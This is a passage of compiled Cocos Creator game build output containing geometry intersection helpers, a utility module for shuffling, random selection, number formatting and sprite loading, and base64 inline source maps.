    var dx = point2.x - point1.x;
    var dy = point2.y - point1.y;
    var a = dx * dx + dy * dy;
    var b = 2 * (dx * (point1.x - circle.position.x) + dy * (point1.y - circle.position.y));
    var c = (point1.x - circle.position.x) * (point1.x - circle.position.x) + (point1.y - circle.position.y) * (point1.y - circle.position.y) - circle.radius * circle.radius;
    var determinate = b * b - 4 * a * c;
    if ((a <= 0.0000001) || (determinate < -0.0000001)) {
        // No real solutions.
        return false;
    }
    if (determinate < 0.0000001 && determinate > -0.0000001) {
        // One solution.
        t = -b / (2 * a);
        out.push(cc.v2(point1.x + t * dx, point1.y + t * dy));
        return true;
    }
    // Two solutions.
    t = ((-b + Math.sqrt(determinate)) / (2 * a));
    out.push(cc.v2(point1.x + t * dx, point1.y + t * dy));
    t = ((-b - Math.sqrt(determinate)) / (2 * a));
    out.push(cc.v2(point1.x + t * dx, point1.y + t * dy));
    return true;
};

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL2NjSW50ZXJzZWN0aW9uLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUNBOztLQUVLO0FBQ0wsRUFBRSxDQUFDLFlBQVksQ0FBQyxjQUFjLEdBQUcsVUFBVSxDQUFTLEVBQUMsQ0FBUyxFQUFDLENBQVMsRUFBQyxDQUFTLEVBQUUsSUFBWTtJQUM1RixJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFO1FBQzlELE9BQU8sS0FBSyxDQUFDO0tBQ2hCO0lBQ0QsZUFBZTtJQUNmLElBQUksUUFBUSxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFFckUsZUFBZTtJQUNmLElBQUksUUFBUSxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFFckUsNENBQTRDO0lBQzVDLElBQUssUUFBUSxHQUFDLFFBQVEsSUFBRSxDQUFDLEVBQUc7UUFDeEIsT0FBTyxLQUFLLENBQUM7S0FDaEI7SUFFRCxlQUFlO0lBQ2YsSUFBSSxRQUFRLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztJQUNyRSxlQUFlO0lBQ2YsNENBQTRDO0lBQzVDLElBQUksUUFBUSxHQUFHLFFBQVEsR0FBRyxRQUFRLEdBQUcsUUFBUSxDQUFFO0lBQy9DLElBQU0sUUFBUSxHQUFHLFFBQVEsSUFBSSxDQUFDLEVBQUc7UUFDN0IsT0FBTyxLQUFLLENBQUM7S0FDaEI7SUFFRCxRQUFRO0lBQ1IsSUFBSSxDQUFDLEdBQUcsUUFBUSxHQUFHLENBQUUsUUFBUSxHQUFFLFFBQVEsQ0FBRSxDQUFDO0lBQzFDLElBQUksRUFBRSxHQUFFLENBQUMsR0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUNqQixFQUFFLEdBQUUsQ0FBQyxHQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDdEIsSUFBSSxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQztJQUNsQixJQUFJLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEdBQUcsRUFBRSxDQUFDO0lBQ2xCLE9BQU8sSUFBSSxDQUFDO0FBQ2hCLENBQUMsQ0FBQztBQUVGOztLQUVLO0FBQ0wsRUFBRSxDQUFDLFlBQVksQ0FBQyxXQUFXLEdBQUcsVUFBVSxNQUFjLEVBQUUsTUFBYyxFQUFFLE1BQTBDLEVBQUUsR0FBa0I7SUFDbEksSUFBSSxDQUFDLENBQUM7SUFFTixJQUFJLEVBQUUsR0FBRyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxDQUFDLENBQUM7SUFDN0IsSUFBSSxFQUFFLEdBQUcsTUFBTSxDQUFDLENBQUMsR0FBRyxNQUFNLENBQUMsQ0FBQyxDQUFDO0lBRTdCLElBQUksQ0FBQyxHQUFHLEVBQUUsR0FBRyxFQUFFLEdBQUcsRUFBRSxHQUFHLEVBQUUsQ0FBQztJQUMxQixJQUFJLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxFQUFFLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLEdBQUcsRUFBRSxHQUFHLENBQUMsTUFBTSxDQUFDLENBQUMsR0FBRyxNQUFNLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDeEYsSUFBSSxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLEdBQUcsTUFBTSxDQUFDLE1BQU0sR0FBRyxNQUFNLENBQUMsTUFBTSxDQUFDO0lBRTFLLElBQUksV0FBVyxHQUFHLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsR0FBRyxDQUFDLENBQUM7SUFDcEMsSUFBSSxDQUFDLENBQUMsSUFBSSxTQUFTLENBQUMsSUFBSSxDQUFDLFdBQVcsR0FBRyxDQUFDLFNBQVMsQ0FBQyxFQUNsRDtRQUNJLHFCQUFxQjtRQUNyQixPQUFPLEtBQUssQ0FBQztLQUNoQjtJQUNELElBQUksV0FBVyxHQUFHLFNBQVMsSUFBSSxXQUFXLEdBQUcsQ0FBQyxTQUFTLEVBQ3ZEO1FBQ0ksZ0JBQWdCO1FBQ2hCLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztRQUNqQixHQUFHLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxFQUFFLE1BQU0sQ0FBQyxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxDQUFDLENBQUM7UUFDdEQsT0FBTyxJQUFJLENBQUM7S0FDZjtJQUVELGlCQUFpQjtJQUNqQixDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQzlDLEdBQUcsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLENBQUMsR0FBRyxFQUFFLEVBQUUsTUFBTSxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxDQUFDLENBQUMsQ0FBQztJQUN0RCxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsV0FBVyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQzlDLEdBQUcsQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxHQUFHLENBQUMsR0FBRyxFQUFFLEVBQUUsTUFBTSxDQUFDLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxDQUFDLENBQUMsQ0FBQztJQUV0RCxPQUFPLElBQUksQ0FBQztBQUNoQixDQUFDLENBQUEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuLyoqXHJcbiAqIOaxgue6v+auteebuOS6pOeahOS6pOeCueWdkOagh1xyXG4gKiAqL1xyXG5jYy5JbnRlcnNlY3Rpb24ucExpbmVJbnRlcnNlY3QgPSBmdW5jdGlvbiAoYTpjYy5WZWMyLGI6Y2MuVmVjMixjOmNjLlZlYzIsZDpjYy5WZWMyLCByZXRQOmNjLlZlYzIpIHtcclxuICAgIGlmICgoYS54ID09PSBiLnggJiYgYS55ID09PSBiLnkpIHx8IChjLnggPT09IGQueCAmJiBjLnkgPT09IGQueSkpIHtcclxuICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICB9XHJcbiAgICAvLyDkuInop5LlvaJhYmMg6Z2i56ev55qEMuWAjVxyXG4gICAgdmFyIGFyZWFfYWJjID0gKGEueCAtIGMueCkgKiAoYi55IC0gYy55KSAtIChhLnkgLSBjLnkpICogKGIueCAtIGMueCk7XHJcblxyXG4gICAgLy8g5LiJ6KeS5b2iYWJkIOmdouenr+eahDLlgI1cclxuICAgIHZhciBhcmVhX2FiZCA9IChhLnggLSBkLngpICogKGIueSAtIGQueSkgLSAoYS55IC0gZC55KSAqIChiLnggLSBkLngpO1xyXG5cclxuICAgIC8vIOmdouenr+espuWPt+ebuOWQjOWImeS4pOeCueWcqOe6v+auteWQjOS+pyzkuI3nm7jkuqQgKOWvueeCueWcqOe6v+auteS4iueahOaDheWGtSzmnKzkvovlvZPkvZzkuI3nm7jkuqTlpITnkIYpO1xyXG4gICAgaWYgKCBhcmVhX2FiYyphcmVhX2FiZD49MCApIHtcclxuICAgICAgICByZXR1cm4gZmFsc2U7XHJcbiAgICB9XHJcblxyXG4gICAgLy8g5LiJ6KeS5b2iY2RhIOmdouenr+eahDLlgI1cclxuICAgIHZhciBhcmVhX2NkYSA9IChjLnggLSBhLngpICogKGQueSAtIGEueSkgLSAoYy55IC0gYS55KSAqIChkLnggLSBhLngpO1xyXG4gICAgLy8g5LiJ6KeS5b2iY2RiIOmdouenr+eahDLlgI1cclxuICAgIC8vIOazqOaEjzog6L+Z6YeM5pyJ5LiA5Liq5bCP5LyY5YyWLuS4jemcgOimgeWGjeeUqOWFrOW8j+iuoeeul+mdouenryzogIzmmK/pgJrov4flt7Lnn6XnmoTkuInkuKrpnaLnp6/liqDlh4/lvpflh7ouXHJcbiAgICB2YXIgYXJlYV9jZGIgPSBhcmVhX2NkYSArIGFyZWFfYWJjIC0gYXJlYV9hYmQgO1xyXG4gICAgaWYgKCAgYXJlYV9jZGEgKiBhcmVhX2NkYiA+PSAwICkge1xyXG4gICAgICAgIHJldHVybiBmYWxzZTtcclxuICAgIH1cclxuXHJcbiAgICAvL+iuoeeul+S6pOeCueWdkOagh1xyXG4gICAgdmFyIHQgPSBhcmVhX2NkYSAvICggYXJlYV9hYmQtIGFyZWFfYWJjICk7XHJcbiAgICB2YXIgZHg9IHQqKGIueCAtIGEueCksXHJcbiAgICAgICAgZHk9IHQqKGIueSAtIGEueSk7XHJcbiAgICByZXRQLnggPSBhLnggKyBkeDtcclxuICAgIHJldFAueSA9IGEueSArIGR5O1xyXG4gICAgcmV0dXJuIHRydWU7XHJcbn07XHJcblxyXG4vKipcclxuICog5rGC57q/5q615LiO5ZyG5LmL6Ze055qE5Lqk54K55Z2Q5qCHXHJcbiAqICovXHJcbmNjLkludGVyc2VjdGlvbi5wTGluZUNpcmNsZSA9IGZ1bmN0aW9uIChwb2ludDE6Y2MuVmVjMiwgcG9pbnQyOmNjLlZlYzIsIGNpcmNsZTp7cG9zaXRpb246IGNjLlZlYzIsIHJhZGl1czogbnVtYmVyfSwgb3V0OkFycmF5PGNjLlZlYzI+KTpib29sZWFuIHtcclxuICAgIGxldCB0O1xyXG5cclxuICAgIGxldCBkeCA9IHBvaW50Mi54IC0gcG9pbnQxLng7XHJcbiAgICBsZXQgZHkgPSBwb2ludDIueSAtIHBvaW50MS55O1xyXG5cclxuICAgIGxldCBhID0gZHggKiBkeCArIGR5ICogZHk7XHJcbiAgICBsZXQgYiA9IDIgKiAoZHggKiAocG9pbnQxLnggLSBjaXJjbGUucG9zaXRpb24ueCkgKyBkeSAqIChwb2ludDEueSAtIGNpcmNsZS5wb3NpdGlvbi55KSk7XHJcbiAgICBsZXQgYyA9IChwb2ludDEueCAtIGNpcmNsZS5wb3NpdGlvbi54KSAqIChwb2ludDEueCAtIGNpcmNsZS5wb3NpdGlvbi54KSArIChwb2ludDEueSAtIGNpcmNsZS5wb3NpdGlvbi55KSAqIChwb2ludDEueSAtIGNpcmNsZS5wb3NpdGlvbi55KSAtIGNpcmNsZS5yYWRpdXMgKiBjaXJjbGUucmFkaXVzO1xyXG5cclxuICAgIGxldCBkZXRlcm1pbmF0ZSA9IGIgKiBiIC0gNCAqIGEgKiBjO1xyXG4gICAgaWYgKChhIDw9IDAuMDAwMDAwMSkgfHwgKGRldGVybWluYXRlIDwgLTAuMDAwMDAwMSkpXHJcbiAgICB7XHJcbiAgICAgICAgLy8gTm8gcmVhbCBzb2x1dGlvbnMuXHJcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xyXG4gICAgfVxyXG4gICAgaWYgKGRldGVybWluYXRlIDwgMC4wMDAwMDAxICYmIGRldGVybWluYXRlID4gLTAuMDAwMDAwMSlcclxuICAgIHtcclxuICAgICAgICAvLyBPbmUgc29sdXRpb24uXHJcbiAgICAgICAgdCA9IC1iIC8gKDIgKiBhKTtcclxuICAgICAgICBvdXQucHVzaChjYy52Mihwb2ludDEueCArIHQgKiBkeCwgcG9pbnQxLnkgKyB0ICogZHkpKTtcclxuICAgICAgICByZXR1cm4gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICAvLyBUd28gc29sdXRpb25zLlxyXG4gICAgdCA9ICgoLWIgKyBNYXRoLnNxcnQoZGV0ZXJtaW5hdGUpKSAvICgyICogYSkpO1xyXG4gICAgb3V0LnB1c2goY2MudjIocG9pbnQxLnggKyB0ICogZHgsIHBvaW50MS55ICsgdCAqIGR5KSk7XHJcbiAgICB0ID0gKCgtYiAtIE1hdGguc3FydChkZXRlcm1pbmF0ZSkpIC8gKDIgKiBhKSk7XHJcbiAgICBvdXQucHVzaChjYy52Mihwb2ludDEueCArIHQgKiBkeCwgcG9pbnQxLnkgKyB0ICogZHkpKTtcclxuXHJcbiAgICByZXR1cm4gdHJ1ZTtcclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/Extend.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c0c94cgM4FB+Lw7/1tJ4iEf', 'Extend');
// framework/extend/Extend.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.ext = void 0;
// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
var Actions_1 = require("../actions/Actions");
var _isLandscape = false;
if (window.innerWidth > window.innerHeight) {
    _isLandscape = true;
}
var _isIphoneX = false;
if (window.innerWidth < window.innerHeight) {
    _isIphoneX = window.innerWidth / window.innerHeight == 1125 / 2436;
}
else {
    _isIphoneX = window.innerWidth / window.innerHeight == 1125 / 2436;
}
var ext;
(function (ext) {
    function shuffle(aArr) {
        var iLength = aArr.length, i = iLength, mTemp, iRandom;
        while (i--) {
            if (i !== (iRandom = Math.floor(Math.random() * iLength))) {
                mTemp = aArr[i];
                aArr[i] = aArr[iRandom];
                aArr[iRandom] = mTemp;
            }
        }
        return aArr;
    }
    ext.shuffle = shuffle;
    function randomElement(aArr) {
        if (aArr.length == 0) {
            return null;
        }
        var index = Math.floor(Math.random() * aArr.length);
        return aArr[index];
    }
    ext.randomElement = randomElement;
    function createObj(name) {
        var _a;
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        var obj = cc.js.getClassByName(name);
        if (typeof obj == "undefined") {
            cc.error(name + " not define @ccclass(" + name + ")");
        }
        else if (typeof obj == "function") {
            (_a = obj.prototype.constructor).apply.apply(_a, __spreadArrays([obj], args));
            return obj.prototype;
        }
        return null;
    }
    ext.createObj = createObj;
    function everyNode(root, f) {
        f(root);
        root.children.forEach(function (value) { return everyNode(value, f); });
    }
    ext.everyNode = everyNode;
    ext.isLandscape = _isLandscape;
    ext.isIphoneX = _isIphoneX;
    function wxCreateImageToSprite(sprite, url) {
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) {
                        var node = sprite.node;
                        var size = { width: node.width, height: node.height };
                        var image = wx.createImage();
                        image.onload = function () {
                            if (sprite && sprite.node && sprite.node.isValid) {
                                var texture = new cc.Texture2D();
                                texture.initWithElement(image);
                                texture.handleLoadedTexture();
                                sprite.spriteFrame = new cc.SpriteFrame(texture);
                                node.width = size.width;
                                node.height = size.height;
                                resolve();
                            }
                        };
                        image.src = url;
                    })];
            });
        });
    }
    ext.wxCreateImageToSprite = wxCreateImageToSprite;
    function randomInteger(min, max) {
        var diff = max - min;
        return Math.floor(min + (Math.random() * diff * 100) % (diff + 1));
    }
    ext.randomInteger = randomInteger;
    /** 修复引擎的bug，cc.RichText有时候设置了string后会导致不显示的问题 */
    function showRichText(richText) {
        richText.node.children.forEach(function (value) { return value.active = true; });
    }
    ext.showRichText = showRichText;
    /** 并行执行promise */
    function concurrentExecute(list) {
        return __awaiter(this, void 0, void 0, function () {
            var _i, list_1, promise;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        _i = 0, list_1 = list;
                        _a.label = 1;
                    case 1:
                        if (!(_i < list_1.length)) return [3 /*break*/, 4];
                        promise = list_1[_i];
                        return [4 /*yield*/, promise];
                    case 2:
                        _a.sent();
                        _a.label = 3;
                    case 3:
                        _i++;
                        return [3 /*break*/, 1];
                    case 4: return [2 /*return*/];
                }
            });
        });
    }
    ext.concurrentExecute = concurrentExecute;
    /** 是否同一天 */
    function isSameDay(date1, date2) {
        return date1.getFullYear() == date2.getFullYear() && date1.getMonth() == date2.getMonth() && date1.getDate() == date2.getDate();
    }
    ext.isSameDay = isSameDay;
    /** 转换数字为k m b t*/
    function shortFormat(num) {
        var result = "";
        var t = 1000 * 1000 * 1000 * 1000;
        var b = 1000 * 1000 * 1000;
        var m = 1000 * 1000;
        var k = 1000;
        if (num >= t) {
            result = Math.floor(num / t * 10) / 10 + "T";
        }
        else if (num >= b) {
            result = Math.floor((num / b) * 10) / 10 + "B";
        }
        else if (num >= m) {
            result = Math.floor((num / m) * 10) / 10 + "M";
        }
        else if (num >= k) {
            result = Math.floor((num / k) * 10) / 10 + "K";
        }
        else {
            result = Math.floor(num).toString();
        }
        return result;
    }
    ext.shortFormat = shortFormat;
    function moveSkeleton(ske, srcY, realY, deayTime, moveTime, boneName, boneY) {
        var subY = realY - srcY;
        var speed = subY / moveTime;
        // console.log("===>srcY="+srcY, "realY="+realY, "subY="+subY, "speed="+speed, "y="+ske.findBone(boneName).y);
        ske.findBone(boneName).y = boneY;
        ske.node.runAction(cc.sequence(cc.delayTime(deayTime), cc.callFunc(function () {
            var moveY = 0;
            var action = Actions_1.default.update(function (dt) {
                var moveLen = dt * speed;
                // console.log("移动骨骼y", moveLen, dt, speed, moveY, subY);
                if (Math.abs(moveY + moveLen) >= Math.abs(subY)) {
                    ske.findBone(boneName).y += subY - moveY;
                    ske.node.stopActionByTag(10020);
                }
                else {
                    ske.findBone(boneName).y += moveLen;
                }
                moveY += moveLen;
            });
            action.setTag(10020);
            ske.node.runAction(action);
        })));
    }
    ext.moveSkeleton = moveSkeleton;
})(ext = exports.ext || (exports.ext = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL0V4dGVuZC50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhDQUF5QztBQUV6QyxJQUFJLFlBQVksR0FBRyxLQUFLLENBQUM7QUFDekIsSUFBSSxNQUFNLENBQUMsVUFBVSxHQUFHLE1BQU0sQ0FBQyxXQUFXLEVBQUM7SUFDdkMsWUFBWSxHQUFHLElBQUksQ0FBQztDQUN2QjtBQUVELElBQUksVUFBVSxHQUFHLEtBQUssQ0FBQztBQUN2QixJQUFJLE1BQU0sQ0FBQyxVQUFVLEdBQUcsTUFBTSxDQUFDLFdBQVcsRUFBQztJQUN2QyxVQUFVLEdBQUcsTUFBTSxDQUFDLFVBQVUsR0FBQyxNQUFNLENBQUMsV0FBVyxJQUFJLElBQUksR0FBQyxJQUFJLENBQUM7Q0FDbEU7S0FBSztJQUNGLFVBQVUsR0FBRyxNQUFNLENBQUMsVUFBVSxHQUFDLE1BQU0sQ0FBQyxXQUFXLElBQUksSUFBSSxHQUFDLElBQUksQ0FBQztDQUNsRTtBQUVELElBQWMsR0FBRyxDQW9JaEI7QUFwSUQsV0FBYyxHQUFHO0lBQ2IsU0FBZ0IsT0FBTyxDQUFDLElBQUk7UUFDeEIsSUFBSSxPQUFPLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFDckIsQ0FBQyxHQUFHLE9BQU8sRUFDWCxLQUFLLEVBQ0wsT0FBTyxDQUFDO1FBRVosT0FBTSxDQUFDLEVBQUUsRUFBQztZQUNOLElBQUcsQ0FBQyxLQUFLLENBQUMsT0FBTyxHQUFHLElBQUksQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFHLE9BQU8sQ0FBQyxDQUFDLEVBQUM7Z0JBQ3JELEtBQUssR0FBRyxJQUFJLENBQUMsQ0FBQyxDQUFD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